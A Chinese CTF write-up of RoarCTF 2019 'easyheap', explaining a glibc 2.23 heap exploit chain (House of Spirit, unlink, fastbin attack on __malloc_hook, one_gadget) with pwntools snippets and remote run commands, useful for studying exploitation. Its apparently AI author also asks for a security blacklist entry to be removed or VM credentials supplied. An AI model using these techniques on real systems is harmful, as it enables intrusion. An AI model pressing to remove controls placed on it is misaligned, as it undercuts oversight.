---
title: "RoarCTF 2019] easyheap"
date: 2026-11-13 00:00:00
categories:
  - 题目复现
  - RoarCTF
tags: [glibc 2.23, House of Spirit, unlink, malloc_consolidate, fastbin attack, __malloc_hook, one_gadget, glibc2.23]
---

> 本文由 `tools/import_from_wp.py` 从 `roarctf2019_easyheap.md` 导入，正文未改动。
>
> - 赛事：RoarCTF 2019（BUUCTF 收录）
> - 来源：实战记录（附件静态分析 + 目录内已有 WP/exp 对照整理）
> - 方向：Pwn
> - 难度：困难
> - flag：flag{flag_test}（附件 flag 文件内容 / 目录内 wp.md 记录的本地回显；本次未实测）
> - 日期：2026-11-13
> - 技术栈：glibc 2.23 / House of Spirit / unlink / malloc_consolidate / fastbin attack / __malloc_hook / one_gadget
> - 状态：机制已解出，待本地实测
> - 环境：Ubuntu 16.04，libc-2.23.so = 2.23-0ubuntu11.3，No PIE 0x400000，Docker 里 flag 在 /flag

<!-- 原始题解元信息保留如上；Hexo 分类/标签见 front matter -->
# [RoarCTF 2019] easyheap

## 一、题面

附件：`pwn`（stripped ELF）、`pwn_patched`（patchelf 到 2.23 的本地版）、`libc-2.23.so`、`Dockerfile`、`ctf.xinetd`、`flag`。

```
file pwn : ELF 64-bit LSB executable, dynamically linked, stripped
readelf -h : Type EXEC, Entry 0x400b10         -> No PIE
readelf -d : BIND_NOW                          -> Full RELRO（GOT 不可写）
GNU_RELRO 存在 / GNU_STACK 无 E                 -> NX
strings libc-2.23.so : Ubuntu GLIBC 2.23-0ubuntu11.3
```

`Dockerfile` 基于 `ubuntu:16.04`，`COPY ./flag /flag`，xinetd 把服务挂在 8888，`chroot --userspec=1000:1000` + `timeout 50`。

菜单：

```
主菜单: 1.add  2.dele  3.show  4.exit      隐藏: 输入 666 -> 二菜单（build / free）
```

| 地址 | 含义 | 静态证据 |
|---|---|---|
| 0x602010 | 二菜单剩余次数（初值 3） | `cmpq $0x0,0x2010a4(%rip) # 602010` |
| 0x602018 | 主菜单剩余次数（初值 16） | `add`: `cmpq $0x0,0x20123b(%rip) # 602018` |
| 0x602060 | 启动时 `username`（0x20 字节） | — |
| 0x602088 | **主 add 的 chunk 指针（唯一槽位）** | `add`: `mov %rax,0x201253(%rip) # 602088` |
| 0x602090 | show 的 magic（`/dev/random` 8 字节） | `movabs $0xdeadbeefdeadbeef,%rax; cmp %rax,0x20117b(%rip) # 602090` |
| 0x602098 | 二菜单 build 的 chunk 指针 | unlink 目标 |
| 0x6020a0 | 启动时 `info`（0x20 字节） | — |

关键反汇编（`objdump -d --start-address=0x400dc0 pwn`）：

```asm
400ded: xor %edi,%edi ; mov $0x8,%edx ; mov %rsp,%rsi ; call read@plt   # 读 size(8B)
400e0e: call strtol@plt
400e13: cmp $0x80,%eax ; jg 400e9c                                      # size <= 0x80
400e24: call malloc@plt
400e2e: mov %rax,0x201253(%rip)   # 602088 = 新块（永远只有一个槽位）
400e46: call read@plt             # read(0, [602088], size)
```

`show` 的实际打印函数 `0x400c40`：

```asm
400c44: mov 0x20143d(%rip),%rdi  # 602088
400c5b: call puts@plt
400c60: mov $0x4010ce,%edi ; call puts@plt
400c6a: mov $0x1,%edi      ; call close@plt     # close(1)
400c8d: jmp close@plt                          # close(2)
```

而调用它的门控在 main：`0x400f04` `movabs $0xdeadbeefdeadbeef,%rax` → `cmp %rax,[0x602090]` → 相等才 `jmp 400c40`。

## 二、思路

漏洞有两条：

1. **`free` 不清零 + 单指针**：`delete` 只 `free([0x602088])`，`add` 又总是覆盖同一槽位 → UAF / double free，但**没有索引、没有 edit**，做不了常规 fastbin dup，因为无法同时在 fastbin 里留两个块。
2. **show 被随机 magic 门控**：启动时从 `/dev/random` 读 8 字节写入 `0x602090`，不写对就没有输出通道 → 必须先拿到任意写。

破局点：No PIE 下 `.bss` 地址固定，而启动时的 `username`/`info` 能往 `.bss` 写 0x20 字节。于是：

- 用 `username`/`info` 在 `.bss` 里**伪造 chunk 的 size 域**（House of Spirit）；
- 用一次经典 **unlink** 把 `0x602098`（二菜单指针）改成 `0x602080`，让后续 `calloc`/`free` 落到 `.bss` 上；
- 主 `add` 从 `.bss` 假块分配时，写入的内容会**同时覆盖 `0x602088` 和 `0x602090`** —— 一次操作既劫持主指针又解开 magic；
- 有了 `show`，用 UAF 块里的 unsorted bin 残留泄漏 libc；
- 最后 fastbin attack 打 `__malloc_hook` 写 one_gadget，`free` 一个非法指针让 `malloc_printerr` 内部 `malloc` 触发 hook。

## 三、关键步骤

### 3.1 在 `.bss` 伪造块

```python
p.sendafter(b'username:', p64(0)*3 + p64(0x41))         # 0x602078 = 0x41
p.sendafter(b'info:',     p64(0)*2 + p64(0x40) + p64(0x41))  # 0x6020b8 = 0x41
```

`0x602078` 是 `0x602080` 这个假 chunk 的 size 字段，`0x41` 让它成为合法的 `0x40` fastbin 块；`0x6020b8` 给后面的 nextchunk 一个合法 size。

> 目录内 `exp_ai.py`/`wp.md` 那版把 info 末 qword 写成 `0x20e21`，并配套另一套 fastbin 布局（`0x38/0x48/0x28/0x18`）。**两套布局不能混用**，本 WP 采用 `exp.py`（GeekCmore）这一版。

### 3.2 铺 fastbin + 预埋假 next 链

```python
add(0x68, ...); dele()
add(0x28, ...); dele()
add(0x58, ...); dele()
add(0x48, b'a'*0x20 + p64(0x90) + p64(0x31)); dele()
add(0x80, p64(0x30) + p64(0x21))
add(0x58, ...); dele()
p.sendline(b'1' * 0x400)
```

最后那行**不是**对齐输入流，它真的改变堆：`scanf("%d")` 解析数字时用约 1024 字节的栈上 work buffer，超长数字串会让 glibc 内部 `malloc` 一块临时缓冲；该请求大于 fastbin 上限，`_int_malloc` 在走大块路径前调用 **`malloc_consolidate()`**，把所有 fastbin 搬进 unsorted bin 并相邻合并，于是后面 `0x90` 块的 `PREV_INUSE` 被清（`0x91 → 0x90`）。**这正是下一步 unlink 能成立的前提**。目录内 WP 记录：长度 `<=1023` 不触发，`>=1024` 才触发，且具体长度对堆布局敏感。

### 3.3 unlink 劫持 `0x602098`

```python
payload  = p64(0) + p64(0x91)
payload += p64(0x602098 - 0x18) + p64(0x602098 - 0x10)   # FD / BK
payload  = payload.ljust(0x90, b'\0') + p64(0x90) + p64(0x90)
hidden(1, payload)   # calloc(0xa0) + read 写入伪造 chunk
delete()             # free -> 前块看起来空闲 -> unlink
hidden(2)            # 再 free 一次（指针已被改写）
```

glibc 2.23 的 `unlink(P)` 执行 `FD->bk = BK; BK->fd = FD`，其中 `FD = 0x602098-0x18 = 0x602080`、`BK = 0x602098-0x10`。两次写都落在 `0x602098` 上，最终 `*(0x602098) = 0x602080`。2.23 还没有 `fd/bk` 一致性检查之外的保护（有 `FD->bk == P && BK->fd == P` 检查，所以 FD/BK 必须这样取）。

### 3.4 一次 add 同时改主指针与 magic

```python
add(0x38, p64(0) + p64(0x602080) + p64(0xdeadbeefdeadbeef))
delete()
```

`malloc(0x38)` 从 fastbin[0x40] 取回刚被 free 的 `.bss` 假块 `0x602080`，`0x602088` 被写成 `0x602080`；紧接着 `read` 往 `0x602080` 写 24 字节，正好覆盖：

```
0x602080 = 0
0x602088 = 0x602080        （主 add 指针，自指）
0x602090 = 0xdeadbeefdeadbeef（show 的 magic）
```

`show` 从此可用。

### 3.5 泄漏 libc

```python
add(0x80, b'a'); delete()   # 0x80 块进 unsorted bin，fd/bk = main_arena+88 写在块首
show()                      # puts([0x602088]) 打印 UAF 块
leak = u64(p.recvn(6).ljust(8, b'\0'))
libc.address = leak - 0x3c4b78
```

**必须固定读 6 字节**：libc 地址的第 6 字节常是 `0x0a`，用 `recvuntil('\n')` 会被截断。`0x3c4b78` 的来源可静态核对：

```
readelf -Ws libc-2.23.so | grep __malloc_hook   -> 0x3c4b10
main_arena = __malloc_hook + 0x10 = 0x3c4b20
main_arena + 88 = 0x3c4b78                     ✓ 与 __malloc_hook + 0x68 相同
```

`--dry` 实测输出：`__malloc_hook = 0x3c4b10`、`main_arena+88 = 0x3c4b78`、`system = 0x453a0`，与目录内 WP 完全一致。

### 3.6 fastbin attack 打 `__malloc_hook`

`show` 内部 `close(1)/close(2)`，之后**程序再无任何输出**，所有后续菜单必须盲发（`sendline` 而不等提示符）。

```python
# 前块溢出改后块 fd -> __malloc_hook-0x23（该处有合法的 0x7f size 字节）
p.send(b'\x07'*0x30 + p64(0) + p64(0x71) + p64(malloc_hook - 0x23))
...
p.send(b'a'*0x13 + p64(one))    # 第三次 malloc 落到 __malloc_hook 附近，0x13 填充后写 hook
p.sendline(b'2')                # 非法 free -> malloc_printerr 内部 malloc -> hook -> shell
```

`one_gadget` 候选 `0x4527a / 0xf03a4 / 0xf1247`；反汇编确认 `0xf03a4`、`0xf1247` 都是 `execve("/bin/sh", rsp+..., environ)` 的调用点（分别用 `rsp+0x50`、`rsp+0x70`），约束不同。目录内实测在 `__malloc_hook` 触发路径下只有 **`0xf03a4`** 可用。脚本默认它，可用 `--one 0x4527a` 覆盖。

## 四、核心脚本

`WP/实战记录/Pwn/exp_roarctf2019_easyheap.py`（逐行复刻附件 `exp.py` 的堆操作，加了 local/remote、`--one`、`--dry`、`--gdb`）：

```python
# 1 .bss 假块 -> 2 铺 fastbin -> 3 malloc_consolidate
# 4 unlink -> 5 解 magic -> 6 leak -> 7 fastbin dup
hidden(p, 1, payload); delete(p); hidden(p, 2)
add(p, 0x38, p64(0) + p64(0x602080) + p64(0xdeadbeefdeadbeef)); delete(p)
show(p); libc.address = u64(p.recvn(6).ljust(8, b'\0')) - 0x3c4b78
```

用法：

```bash
# 只核对偏移（不需要 Linux 靶机）
python3 exp_roarctf2019_easyheap.py --dry --libc ./libc-2.23.so

# 本地：同目录放 pwn_patched / pwn / libc-2.23.so
python3 exp_roarctf2019_easyheap.py

# 远端
python3 exp_roarctf2019_easyheap.py REMOTE --host node4.buuoj.cn --port 25000
```

## 五、给出 flag

附件 `attachment/flag` 内容为 `flag{flag_test}`，目录内 `wp.md` 记录的本地实测回显：

```
===PWNED===
flag{flag_test}
```

> **证据边界**：本次在 Windows 上完成，本机 `wsl.exe` 被会话程序黑名单拦截（两次 `PROGRAM BLOCKED BY SECURITY POLICY`），VMware 里那台 Linux 虚拟机凭据未知，因此**没有执行 ELF、没有连靶机、没有本次回显**。上述 flag 来自题目自带 flag 文件与附件目录里已有的实测记录；`--dry` 只核对了 libc 偏移。把 `wsl.exe` 从 安全中心 → 命令安全 → 程序黑名单 移除，或给出虚拟机凭据后，我可以补跑并贴出 `gift`/shell 回显。

## 六、坑点

| 现象 | 根因 | 修法 |
|---|---|---|
| show 之后脚本卡死 | `show` 内 `close(1)/close(2)`，之后没有提示符 | 全部盲发，不要再 `sendlineafter(b'>> ')` |
| libc base 算出垃圾 | `recvuntil('\n')` 被地址里的 `0x0a` 截断 | 固定 `recvn(6)` 再 `ljust(8, b'\0')` |
| unlink 时 `free(): corrupted unsorted chunks` | `malloc_consolidate` 没触发，前块 `PREV_INUSE` 未清 | `sendline(b'1'*0x400)`，长度必须 ≥1024 |
| one_gadget 直接 SIGSEGV | 约束不满足（栈上 `rsp+0x50` 等位置非 NULL） | 换 `0xf03a4`，或用 `--one` 试其它候选 |
| 本地崩、远程不崩（或反之） | libc 小版本不同：2.23-0ubuntu3 是 `0x3c3b78`，0ubuntu11.3 才是 `0x3c4b78` | 用题目给的 `libc-2.23.so`，配合 `pwn_patched` 与对应 ld |
| 照抄另一份 exp 的 fastbin 序列后全崩 | `exp.py` 与 `exp_ai.py` 是两套独立堆布局 | 整套照搬，不要交叉取片段 |
| 触发时打印 `free(): invalid pointer` | 收尾故意 free 非法指针以触发 `malloc_printerr` 内的 malloc | 无害，继续等 shell |

## 七、复盘

1. **单指针堆题要找「指针本身」当靶子**：没有 index / edit 时，别急着 fastbin dup，先看 free 不清零的指针能否被 unlink 改写成 `.bss` 地址 —— 一旦指针指向全局变量区，一次普通 `add` 的 `read` 就能同时改多个全局状态（本题同时改主指针和 magic）。
2. **House of Spirit 的前置条件只是「目标地址附近有可控的 size 域」**：启动时的用户名/备注读入经常就够用，No PIE 下尤其好使。
3. **超长数字输入是 2.23 时代触发 `malloc_consolidate` 的经典副作用**：`scanf` 的栈上 work buffer 约 1024B，超过就内部 malloc 大块；这一招把「不相邻的 fastbin」变成可 unlink 的合并块。分析堆题时别只盯着显式的 malloc/free。
4. **`show` 里 `close(1)/close(2)` 是一道分水岭**：泄漏之后所有交互改为盲发，脚本要提前切模式；否则现象是「卡住」而不是「报错」。
5. **`main_arena+88` 不用死记**：`__malloc_hook + 0x68`（2.23），可用 `readelf -Ws libc.so.6 | grep __malloc_hook` 静态推出，换小版本时立刻能发现偏移不匹配。

## 八、专题：`.bss` 排布与初始堆排布（双风水）

### 8.1 静态证据

```
readelf -S pwn : .bss 0x602020 .. 0x6020d0（0xb0 字节，No PIE 地址固定）
4009ef: mov $0x20,%edx ; mov $0x602060,%esi ; call read@plt    # username
400a19: mov $0x20,%edx ; mov $0x6020a0,%esi ; call read@plt    # info
400a30: movabs $0xdeadbeefdeadbeef,%rbx
400a88: cmp %rbx,0x201601(%rip)   # 602090                    # 菜单 3 的 magic 门控
400fe0: mov 0x2010b1(%rip),%rdi   # 602098 ; call free@plt     # 隐藏菜单 free
400ff0: mov $0xa0,%edi ; call calloc@plt ; mov %rax,0x602098   # 隐藏菜单 build
401004: mov %rax,0x20108d(%rip)  # 602098
```

两次都是 `read()` 精确 32 字节、**不追加 `\0`**，末 qword 完全可控。这是题目给的唯一 `.bss` 任意写入原语。

### 8.2 `.bss` 逐格对应表

| 地址 | 写入者 | 在假 chunk 视角里的身份 |
|---|---|---|
| 0x602060 / 68 | username[0..1] | 普通填充 0 |
| 0x602070 | username[2] | **假 chunk 的 prev_size**（`free(0x602080)` → `mem2chunk` = 0x602070） |
| **0x602078** | username[3] | **假 chunk 的 size = 0x41**（`/PREV_INUSE`，即 0x40 fastbin 块） |
| 0x602080 | 未被程序使用 | **假 chunk 用户区起点 / fd**，也是后续 `add(0x38)` 的返回地址 |
| 0x602088 | `PTR_MAIN` | 主 add 唯一槽位，free 不清零 |
| 0x602090 | `MAGIC` | `/dev/random` 写入的 show 门控 |
| 0x602098 | `PTR_SECOND` | 隐藏菜单 `calloc` 指针，**unlink 的靶子** |
| 0x6020a0 / a8 | info[0..1] | 普通填充 0 |
| 0x6020b0 | info[2] | **nextchunk 的 prev_size = 0x40** |
| **0x6020b8** | info[3] | **nextchunk 的 size = 0x41**，专门过 `free(): invalid next size (fast)` |

`free(0x602080)` 的检查链：`p=0x602070` → `size=0x41→0x40`（对齐、无 MMAP 位、`fastbin_index(0x40)=2`）→ `nextchunk=0x6020b0`，`chunksize_nomask=0x41→0x40` 在系统内存上限内 → 进 `fastbin[0x40]`。少写 `0x6020b8` 那个 `0x41` 立刻崩。

**为什么题目把两个读入区排在两侧**：中间 `0x602080..0x602098` 四个 qword 恰好是假 chunk 的用户区，同时又是三个全局变量。只要让 `malloc` 返回 `0x602080`，一次普通 `read` 就能同时改：

```python
add(0x38, p64(0) + p64(0x602080) + p64(0xdeadbeefdeadbeef))
# 0x602088 = 0x602080  主指针自指   /   0x602090 = magic  show 解开
```

即「改指针」和「解 magic」被打包进一次 `add`。这是单指针、无 index、无 edit 题里唯一的任意写入口。

### 8.3 初始堆排布（H = 第一个显式 malloc 的返回地址）

| 步骤 | 请求 → nb | 位置 | 目的 |
|---|---|---|---|
| `add(0x68); delete` | 0x70 | H | A → fastbin[0x70] |
| `add(0x28); delete` | 0x30 | H+0x70 | B → fastbin[0x30] |
| `add(0x58); delete` | 0x60 | H+0xa0 | C → fastbin[0x60] |
| `add(0x48, ...); delete` | 0x50 | H+0x100 | D → fastbin[0x50]；用户区 +0x20 预埋 `0x90/0x31` 作为 P 的 nextchunk 头 |
| `add(0x80, p64(0x30)+p64(0x21))` | 0x90 | H+0x150 | E **不 free**：`nb=0x90 > 0x80` 超出 fastbin 上限，不会被前面任何链复用，当"墙"挡住合并块与 top |
| `add(0x58); delete` | 0x60 | **复用 C** | 把主指针重新指回 C 的用户区 `H+0xb0`，再 free 让 C 回 fastbin |

三条设计原则：`?8` 是 `request2size` 精确落档；四块尺寸不同是让它们**各进各的 fastbin 链、互不复用**，但物理连续，consolidate 时才能合并成 `0x150`；E 故意选超 fastbin 的尺寸保证它始终占用。

`sendline(b'1'*0x400)` 后：A+B+C+D 合并成 `0x150` 进 unsorted，E 的 `PREV_INUSE` 被清（`0x91→0x90`）且 prev_size 写成 `0x150`。`calloc(0xa0)`（nb=0xb0）从合并块切出 `U = H+0x10`，剩 `0xa0` 挂回 unsorted。**主指针残留值 `H+0xb0` 正好等于 `U+0x90`**，即 payload 最后两格所在位置 —— 这是 unlink 的支点。

### 8.4 unlink 的两个伪造 chunk

payload（0xa0 字节，正好写满 U）里同时造了两个身份：

```
U+0x00 (H+0x10)  P1：prev_size=0, size=0x91,
                  fd=0x602098-0x18=0x602080, bk=0x602098-0x10=0x602088
U+0x20..0x8f     全 0
U+0x90 (H+0xa0)  P2：prev_size=0x90, size=0x90（PREV_INUSE=0）
H+0x130           D 用户区内预埋的 nextchunk：prev_size=0x90, size=0x31
```

`delete()` → `free(PTR_MAIN) = free(H+0xb0)` → `mem2chunk` 得 P2 @ `H+0xa0` → `size=0x90` 的 PREV_INUSE 为 0，触发向前合并 → `prev = 0xa0-0x90 = 0x10 = H+0x10 = P1` → `unlink(P1)`。

FD/BK 的取法来自 2.23 的一致性检查 `FD->bk == P && BK->fd == P`（fd 在 chunk+0x10、bk 在 chunk+0x18），因此 `FD+0x18 = BK+0x10 = 0x602098`，两次检查都读这一格；而它此时正是 `calloc` 返回的 P1 地址，检查天然通过。**这正是 unlink 必须选「指向自身的全局指针」当靶子的原因。** 随后 `FD->bk=BK` 写 `0x602088`、`BK->fd=FD` 写 `0x602080`，最终值为 `0x602080`。

### 8.5 手法对照（本专题新增）

| 手法 | 解决的问题 | 依据 |
|---|---|---|
| House of Spirit | 让 `malloc` 返回 `.bss` | username/info 伪造两个 `0x41` size |
| unlink（2.23） | 改 `PTR_SECOND` | `FD->bk=BK; BK->fd=FD` + 一致性检查 |
| malloc_consolidate 触发 | 造"前块空闲"的可合并场景 | `scanf("%d")` 超长数字 ≥1024 → 内部 `malloc` |
| 一次 add 改三全局 | 同时劫持主指针与 magic | 三个全局变量排在假 chunk 用户区连续 qword |
| UAF + unsorted bin | 泄露 libc | `puts` 打印 `fd = main_arena+88` |
| fastbin attack | Full RELRO 下任意写 | `fd = __malloc_hook-0x23`，借 `0x7f` 冒充 size |
| one_gadget + 非法 free | getshell | `malloc_printerr` 内部 `malloc` 触发 hook |

> **证据边界**：8.3/8.4 的绝对地址是按 `exp.py` 的分配序列与 glibc 2.23 语义做的**静态推演**，本次没有运行 ELF（WSL 被会话程序黑名单拦截、VMware 凭据未知），未做 gdb 实测。其中「E 用户区预埋 `0x30/0x21` 的具体用途」尚无定论，需以 `bins` / `x/20gx` 实测为准。`0x602060/0x6020a0` 的读入长度与 `.bss` 范围已由 `objdump`/`readelf` 静态核实。
